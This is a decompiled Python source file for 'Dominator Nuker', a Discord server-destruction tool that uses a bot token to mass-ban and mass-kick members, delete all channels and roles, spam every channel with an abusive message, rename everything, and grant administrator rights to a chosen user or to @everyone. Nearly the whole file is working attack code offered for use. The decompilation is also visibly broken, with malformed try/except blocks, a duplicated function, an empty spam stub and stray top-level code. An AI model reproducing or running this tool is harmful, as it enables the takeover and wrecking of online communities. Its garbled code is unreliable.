# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: dn.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global HEADERS  # inserted
import discord
from discord.ext import commands
import requests
import random
from rexlogger import rex
import asyncio
import threading
import json
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import base64
import random
import colorama
from colorama import Fore, Back, Style
import asyncio
import json
from pystyle import *
import logging
import datetime
from threading import Thread
import queue
from datetime import datetime, timezone
import datetime
import aiohttp
from discord.ext import tasks
from pystyle import Colorate, Colors, Col, Center
intents = discord.Intents.default()
intents.typing = False
intents.presences = False
current_time = datetime.datetime.now().strftime('%H:%M:%S')

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:  # inserted
        os.system('clear')

def set_console_title(title):
    os.system(f'title {title}')

def get_valid_token():
    while True:
        token = input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Enter Token {Fore.LIGHTBLACK_EX}» ')
        headers = {'Authorization': f'Bot {token}'}
        print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Checking token.')
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Token valid.')
            return token
        print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Please enter a valid token.')

def get_valid_guild(prompt, is_valid):
    while True:
        user_input = input(prompt)
        print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Checking guild.')
        if len(user_input) > 10 and is_valid(user_input):
            return user_input
        print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Please enter a valid guild id.')

def is_valid_guild_id(guild_id):
    headers = {'Authorization': f'Bot {BOT_TOKEN}'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    return response.status_code == 200

def get_integer_input(prompt):
    try:
        pass  # postinserted
    user_input = int(input(prompt))
    return user_input
    except ValueError:
        print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Please enter a valid integer.')
        pass
    else:  # inserted
        try:
            pass  # postinserted
        pass
BASE_URL = 'https://discord.com/api/v10'
intents = discord.Intents.default()
intents.typing = False
intents.presences = False
bot = commands.Bot(command_prefix='!', intents=intents)
status_messages = ['Dominator x Warrior', 'Dominator Nuker']

@bot.event
async def on_ready():
    """Triggered when the bot is ready."""  # inserted
    change_status.start()

@tasks.loop(seconds=10)
async def change_status():
    """Periodically update bot\'s status."""  # inserted
    for status in status_messages:
        await bot.change_presence(status=discord.Status.idle, activity=discord.Game(name=status))
        await asyncio.sleep(10)
somi = f'             \n                    {Fore.RED}    ▓█████▄  ▒█████   ███▄ ▄███▓ ██▓ ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███  \n                        ▒██▀ ██▌▒██▒  ██▒▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒\n                        ░██   █▌▒██░  ██▒▓██    ▓██░▒██▒▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒\n                        ░▓█▄   ▌▒██   ██░▒██    ▒██ ░██░▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  \n                        ░▒████▓ ░ ████▓▒░▒██▒   ░██▒░██░▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒\n                         ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░\n                         ░ ▒  ▒   ░ ▒ ▒░ ░  ░      ░ ▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░\n                         ░ ░  ░ ░ ░ ░ ▒  ░      ░    ▒ ░   ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ \n                           ░        ░ ░         ░    ░           ░       ░  ░            ░ ░     ░     \n                         ░ \n                                           ╔══                            ══╗       \n                                           ║ DEV - @.w4rri0r. & @ravneet.fy ║\n                                             SUPPORT - /rascalsop   \n                                             GIT - github.com/dominator\n                                             IG - instagram.com/ofc.warri0r\n                                           ║ YT - youtube.com/@Warriorjija  ║                                           \n                                           ╚══                            ══╝\n\n\n                            ##############################################################\n                                  〔 Dominator is relly dominating the Cord..!! 〕\n                            ##############################################################      \n\n               {Fore.RED}             ╔═════                  ═════╗     ╔═════                  ═════╗ \n                               [01] - Mass Ban Members            [08] - Create Channels\n                               [02] - Mass Kick Members           [09] - Shuffle Channels\n                               [03] - Delete All Channels         [10] - Create Roles\n                               [04] - Rename All Channels         [11] - Rename Guild\n                               [05] - Rename All Roles            [12] - Get Admin\n                               [06] - Delete All Roles            [13] - Admin Everyone\n                               [07] - Spam Channels               [14] - Credits  \n                            ╚══╦══                  ═════╝     ╚═════                  ═╦═══╝\n                               ║                   [15] - Exit                          ║\n                               ╩════════════════════════════════════════════════════════╩\n\n\n'

def get_menu():
    clear()
    print(somi)
    option = rex.input('Choose an option:')
    return option

async def execute_option(option):
    if option == '15':
        user_id = 1030928299620302960
        await mass_unban_members(user_id)

async def execute_option(option):
    if option == '1':
        await mass_ban_members()
        input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
    else:  # inserted
        if option == '2':
            await mass_kick_members()
            input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
        else:  # inserted
            if option == '3':
                await delete_all_channels()
                input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
            else:  # inserted
                if option == '4':
                    await rename_all_channels()
                    input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                else:  # inserted
                    if option == '5':
                        await rename_all_roles()
                        input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                    else:  # inserted
                        if option == '6':
                            await delete_all_roles()
                            input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                        else:  # inserted
                            if option == '7':
                                await spam_all_channels()
                                input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                            else:  # inserted
                                if option == '8':
                                    await create_channels()
                                    input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                                else:  # inserted
                                    if option == '9':
                                        await shuffle_channels()
                                        input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                                    else:  # inserted
                                        if option == '10':
                                            await create_roles()
                                            input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                                        else:  # inserted
                                            if option == '11':
                                                await rename_guild()
                                                input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                                            else:  # inserted
                                                if option == '12':
                                                    await get_admin()
                                                    input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                                                else:  # inserted
                                                    if option == '13':
                                                        await give_admin_perms()
                                                        input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                                                    else:  # inserted
                                                        if option == '14':
                                                            print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Credits: Developed by @.w4rri0r. & @ravneet.fy')
                                                            input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')
                                                        else:  # inserted
                                                            if option == '15':
                                                                print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Thanks For using Dominator Nuker')
                                                                exit()
                                                            else:  # inserted
                                                                print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Invalid option!')
                                                                input(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Press Enter to Go back {Fore.LIGHTBLACK_EX}» ')

async def mass_ban_members():
    use_file = rex.input('Do you want to fetch member IDs from members.txt? (y/n): ').strip().lower()
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        semaphore = asyncio.Semaphore(49)

        async def ban_member(user_id):
            async with semaphore:
                ban_url = f'{BASE_URL}/guilds/{GUILD_ID}/bans/{user_id}'
                ban_data = {'reason': 'Dominator x Warrior has spoken'}
                async with session.put(ban_url, json=ban_data) as ban_response:
                    if ban_response.status == 204:
                        rex.success(f'User {user_id} has been banned.')
                    else:  # inserted
                        if ban_response.status == 429:
                            retry_after = (await ban_response.json()).get('retry_after', 1)
                            rex.warn(f'Rate limited! Retrying in {retry_after} seconds...')
                            await asyncio.sleep(retry_after)
                            await ban_member(user_id)
                        else:  # inserted
                            rex.error(f'Failed to ban user {user_id}: {await ban_response.text()}')
        if use_file == 'y':
            try:
                with open('member.txt', 'r') as file:
                    pass  # postinserted
            except FileNotFoundError:
                    user_ids = [line.strip() for line in file if line.strip()]
                    else:  # inserted
                        tasks = [ban_member(user_id) for user_id in user_ids]
                        await asyncio.gather(*tasks)
        else:  # inserted
            if use_file == 'n':
                user_ids = []
                after = None
                while True:
                    guild_members_url = f'{BASE_URL}/guilds/{GUILD_ID}/members?limit=1000'
                    if after:
                        guild_members_url += f'&after={after}'
                    async with session.get(guild_members_url) as response:
                        if response.status == 200:
                            members = await response.json()
                            if not members:
                                break
                            user_ids.extend([member['user']['id'] for member in members])
                            after = members[(-1)]['user']['id']
                        else:  # inserted
                            if response.status == 429:
                                retry_after = (await response.json()).get('retry_after', 1)
                                rex.warn(f'Rate limited while fetching members! Retrying in {retry_after} seconds...')
                                await asyncio.sleep(retry_after)
                            else:  # inserted
                                rex.error(f'Failed to fetch members: {await response.text()}')
                                return
                tasks = [ban_member(user_id) for user_id in user_ids]
                await asyncio.gather(*tasks)
            rex.error('members.txt file not found.')
            return None

async def mass_kick_members():
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        guild_members_url = f'{BASE_URL}/guilds/{GUILD_ID}/members?limit=1000'
        async with session.get(guild_members_url) as response:
            if response.status == 200:
                members = await response.json()
                semaphore = asyncio.Semaphore(47)

                async def kick_member(member):
                    async with semaphore:
                        user_id = member['user']['id']
                        kick_url = f'{BASE_URL}/guilds/{GUILD_ID}/members/{user_id}'
                        while True:
                            async with session.delete(kick_url) as kick_response:
                                if kick_response.status in [200, 204]:
                                    rex.success(f'User {user_id} has been kicked.')
                                    break
                                if kick_response.status == 429:
                                    retry_after = (await kick_response.json()).get('retry_after', 1)
                                    rex.ratelimit(f'Rate limit hit. Retrying after {retry_after} seconds...')
                                    await asyncio.sleep(retry_after)
                                else:  # inserted
                                    rex.error(f'Failed to kick user {user_id}: {await kick_response.text()}')
                                    return None
                tasks = [kick_member(member) for member in members]
                await asyncio.gather(*tasks)
            else:  # inserted
                rex.error(f'Failed to fetch members: {await response.text()}')

async def delete_all_channels():
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        channels_url = f'{BASE_URL}/guilds/{GUILD_ID}/channels'
        async with session.get(channels_url) as response:
            if response.status == 200:
                channels = await response.json()
                semaphore = asyncio.Semaphore(47)

                async def delete_channel(channel):
                    async with semaphore:
                        channel_id = channel['id']
                        delete_url = f'{BASE_URL}/channels/{channel_id}'
                        async with session.delete(delete_url) as delete_response:
                            if delete_response.status in [200, 204]:
                                rex.success(f'Channel {channel_id} deleted.')
                            else:  # inserted
                                rex.error(f'Failed to delete channel {channel_id}: {await delete_response.text()}')
                tasks = [delete_channel(channel) for channel in channels]
                await asyncio.gather(*tasks)
            else:  # inserted
                rex.error(f'Failed to fetch channels: {await response.text()}')

async def rename_all_channels():
    new_name = rex.input('Enter the new name for all channels: ').strip()
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        channels_url = f'{BASE_URL}/guilds/{GUILD_ID}/channels'
        async with session.get(channels_url) as response:
            if response.status == 200:
                channels = await response.json()
                semaphore = asyncio.Semaphore(47)

                async def rename_channel(channel):
                    async with semaphore:
                        channel_id = channel['id']
                        rename_url = f'{BASE_URL}/channels/{channel_id}'
                        rename_data = {'name': new_name}
                        async with session.patch(rename_url, json=rename_data) as rename_response:
                            if rename_response.status == 200:
                                rex.success(f'Channel {channel_id} renamed to {new_name}.')
                            else:  # inserted
                                rex.error(f'Failed to rename channel {channel_id}: {await rename_response.text()}')
                tasks = [rename_channel(channel) for channel in channels]
                await asyncio.gather(*tasks)
            else:  # inserted
                rex.error(f'Failed to fetch channels: {await response.text()}')

async def rename_all_roles():
    new_name = rex.input('Enter the new name for all roles: ').strip()
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        roles_url = f'{BASE_URL}/guilds/{GUILD_ID}/roles'
        async with session.get(roles_url) as response:
            if response.status == 200:
                roles = await response.json()
                semaphore = asyncio.Semaphore(47)

                async def rename_role(role):
                    async with semaphore:
                        role_id = role['id']
                        rename_url = f'{BASE_URL}/guilds/{GUILD_ID}/roles/{role_id}'
                        rename_data = {'name': new_name}
                        async with session.patch(rename_url, json=rename_data) as rename_response:
                            if rename_response.status == 200:
                                rex.success(f'Role {role_id} renamed to {new_name}.')
                            else:  # inserted
                                rex.error(f'Failed to rename role {role_id}: {await rename_response.text()}')
                tasks = [rename_role(role) for role in roles]
                await asyncio.gather(*tasks)
            else:  # inserted
                rex.error(f'Failed to fetch roles: {await response.text()}')

async def delete_all_roles():
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        roles_url = f'{BASE_URL}/guilds/{GUILD_ID}/roles'
        async with session.get(roles_url) as response:
            if response.status == 200:
                roles = await response.json()
                semaphore = asyncio.Semaphore(47)

                async def delete_role(role):
                    async with semaphore:
                        role_id = role['id']
                        delete_url = f'{BASE_URL}/guilds/{GUILD_ID}/roles/{role_id}'
                        async with session.delete(delete_url) as delete_response:
                            if delete_response.status == 204:
                                rex.success(f'Role {role_id} deleted.')
                            else:  # inserted
                                rex.error(f'Failed to delete role {role_id}: {await delete_response.text()}')
                tasks = [delete_role(role) for role in roles]
                await asyncio.gather(*tasks)
            else:  # inserted
                rex.error(f'Failed to fetch roles: {await response.text()}')

async def create_channels():
    num_channels = int(rex.input('Enter the number of channels to create: '))
    base_name = rex.input('Enter the name for the channels: ').strip()
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        semaphore = asyncio.Semaphore(47)

        async def create_channel(index):
            async with semaphore:
                channel_name = f'{base_name}'
                url = f'{BASE_URL}/guilds/{GUILD_ID}/channels'
                data = {'name': channel_name, 'type': 0}
                async with session.post(url, json=data) as response:
                    if response.status == 201:
                        rex.success(f'Channel {channel_name} created.')
                    else:  # inserted
                        rex.error(f'Failed to create channel {channel_name}: {await response.text()}')
        tasks = [create_channel(i) for i in range(1, num_channels + 1)]
        await asyncio.gather(*tasks)
import asyncio
import aiohttp
import random

async def shuffle_channels():
    TOKEN = BOT_TOKEN
    HEADERS = {'Authorization': f'Bot {TOKEN}', 'Content-Type': 'application/json'}
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        channels_url = f'{BASE_URL}/guilds/{GUILD_ID}/channels'
        async with session.get(channels_url) as response:
            if response.status == 200:
                channels = await response.json()
                random.shuffle(channels)
                semaphore = asyncio.Semaphore(47)

                async def reorder_channel(channel, position):
                    async with semaphore:
                        channel_id = channel['id']
                        reorder_url = f'{BASE_URL}/channels/{channel_id}'
                        reorder_data = {'position': position}
                        async with session.patch(reorder_url, json=reorder_data) as reorder_response:
                            if reorder_response.status == 200:
                                rex.success('Channel {channel_id} shuffled...!!')
                            else:  # inserted
                                rex.error('Failed to shuffle channel {channel_id}')
                tasks = [reorder_channel(channel, index) for index, channel in enumerate(channels)]
                await asyncio.gather(*tasks)
            else:  # inserted
                rex.error('Failed to fetch channels')

async def create_roles():
    num_roles = int(rex.input('Enter the number of roles to create: '))
    base_name = rex.input('Enter the base name for the roles: ').strip()
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        semaphore = asyncio.Semaphore(10)
        time.sleep(2)

        async def create_role(index):
            async with semaphore:
                role_name = f'{base_name}-{index}'
                color = random.randint(0, 16777215)
                url = f'{BASE_URL}/guilds/{GUILD_ID}/roles'
                data = {'name': role_name, 'color': color}
                async with session.post(url, json=data) as response:
                    if response.status == 201:
                        rex.success(f'Role {role_name} created with color {color}.')
                    else:  # inserted
                        rex.success(f' Role {role_name} created')
        tasks = [create_role(i) for i in range(1, num_roles)]
        await asyncio.gather(*tasks)
        semaphore = asyncio.Semaphore(10)
import asyncio
import aiohttp
import time

async def spam_all_channels():
    message_to_spam = rex.input('Enter the message to spam: ').strip()
    num_messages = int(rex.input('Enter the number of messages to send per channel: '))
    watermark = ' \nDominator Nuker - discord.gg/rascalsop fucked you!'
    message_to_spam += watermark
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        channels_url = f'{BASE_URL}/guilds/{GUILD_ID}/channels'
        async with session.get(channels_url) as response:
            if response.status == 200:
                channels = await response.json()
                semaphore = asyncio.Semaphore(35)
                time.sleep(1)

                async def send_message(channel_id):
                    message_url = f'{BASE_URL}/channels/{channel_id}/messages'
                    message_data = {'content': message_to_spam}
                    pass
                tasks = []
                for _ in range(num_messages):
                    for channel in channels:
                        if channel['type'] == 0:
                            tasks.append(send_message(channel['id']))
                await asyncio.gather(*tasks)
            else:  # inserted
                rex.error(f'Failed to fetch channels: {await response.text()}')

async def rename_guild():
    new_name = rex.input('Enter the new name for the guild: ').strip()
    url = f'{BASE_URL}/guilds/{GUILD_ID}'
    data = {'name': new_name}
    response = requests.patch(url, headers=HEADERS, json=data)
    if response.status_code == 200:
        rex.success(f'Guild renamed to {new_name}.')
    else:  # inserted
        rex.error(f'Failed to rename guild: {response.json()}')

async def get_admin():
    user_id = rex.input('Enter the User ID to assign the role to: ').strip()
    if not user_id.isdigit():
        rex.error('Invalid User ID. Please enter a numeric User ID.')
        return
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        roles_url = f'{BASE_URL}/guilds/{GUILD_ID}/roles'
        role_data = {'name': 'Dominator Nuker <$', 'permissions': 8, 'mentionable': False}
        rex.debug('Creating role...')
        async with session.post(roles_url, json=role_data) as role_response:
            if role_response.status == 201:
                role = await role_response.json()
                role_id = role.get('id')
                if role_id:
                    rex.success(f"Role \'{role_data['name']}\' created successfully with ID {role_id}.")
                else:  # inserted
                    rex.error(f'Role creation succeeded, but no role ID was returned. Response: {role}')
                    return
            else:  # inserted
                error_msg = await role_response.text()
                rex.error(f'Failed to create role. Status: {role_response.status}, Response: {error_msg}')
                return
        member_url = f'{BASE_URL}/guilds/{GUILD_ID}/members/{user_id}'
        rex.debug(f'Fetching roles for user ID {user_id}...')
        async with session.get(member_url) as member_response:
            if member_response.status == 200:
                member_data = await member_response.json()
                current_roles = member_data.get('roles', [])
            else:  # inserted
                error_msg = await member_response.text()
                rex.error(f'Failed to fetch user data. Response: {error_msg}')
                return
        assign_role_url = f'{BASE_URL}/guilds/{GUILD_ID}/members/{user_id}'
        updated_roles = current_roles + [role_id]
        assign_data = {'roles': updated_roles}
        rex.debug(f'Assigning role ID {role_id} to user ID {user_id}...')
        async with session.patch(assign_role_url, json=assign_data) as assign_response:
            if assign_response.status in [200, 204]:
                rex.success(f"Role \'{role_data['name']}\' successfully assigned to user {user_id}.")
            else:  # inserted
                error_msg = await assign_response.text()
                rex.error(f'Failed to assign role to user {user_id}. Response: {error_msg}')

async def give_admin_perms():
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        roles_url = f'{BASE_URL}/guilds/{GUILD_ID}/roles'
        async with session.get(roles_url) as response:
            if response.status == 200:
                roles = await response.json()
                everyone_role_id = None
                for role in roles:
                    if role['name'] == '@everyone':
                        everyone_role_id = role['id']
                        break
                if everyone_role_id:
                    update_url = f'{BASE_URL}/guilds/{GUILD_ID}/roles/{everyone_role_id}'
                    update_data = {'permissions': '8', 'mentionable': False}
                    async with session.patch(update_url, json=update_data) as update_response:
                        if update_response.status == 200:
                            rex.success('Admin permissions granted to @everyone role.')
                        else:  # inserted
                            rex.error(f'Failed to update @everyone role: {await update_response.text()}')
                else:  # inserted
                    rex.error('Could not find @everyone role.')
            else:  # inserted
                rex.error(f'Failed to fetch roles: {await response.text()}')
TOKEN = ()
url_bans = f'https://discord.com/api/v10/guilds/{get_valid_guild}/bans'
headers = {'Authorization': f'Bot {TOKEN}', 'Content-Type': 'application/json'}

def mass_unban_members(user_id):
    url = f'https://discord.com/api/v10/guilds/{GUILD_ID}/bans/{user_id}'
    response = requests.delete(url, headers=headers)
    if response.status_code == 204:
        print(f'Successfully unbanned user {user_id}')
    else:  # inserted
        print(f'Failed to unban user {user_id}. Status code: {response.status_code}, Response: {response.text}')
response = requests.get(url_bans, headers=headers)
if response.status_code == 200:
    banned_users = response.json()
    for banned_user in banned_users:
        user_id = banned_user['user']['id']
        mass_unban_members(user_id)
else:  # inserted
    print(f'Failed to fetch bans. Status code: {response.status_code}, Response: {response.text}')
clear()
set_console_title('Dominator Nuker v1 [discord.gg/rascalsop]')
BOT_TOKEN = get_valid_token()
GUILD_ID = get_valid_guild(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.MAGENTA}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.MAGENTA} INPUT {Fore.LIGHTWHITE_EX}» Enter Guild Id {Fore.LIGHTBLACK_EX}» ', is_valid_guild_id)
print(f'{Fore.LIGHTBLACK_EX}[-( {Fore.LIGHTWHITE_EX}{current_time}{Fore.LIGHTBLACK_EX} )-] [{Fore.LIGHTCYAN_EX}●{Fore.LIGHTBLACK_EX}]{Fore.LIGHTWHITE_EX}{Fore.LIGHTCYAN_EX} INFO {Fore.LIGHTWHITE_EX}» Guild valid.')
HEADERS = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}

while True:
    option = get_menu()
    asyncio.run(execute_option(option))
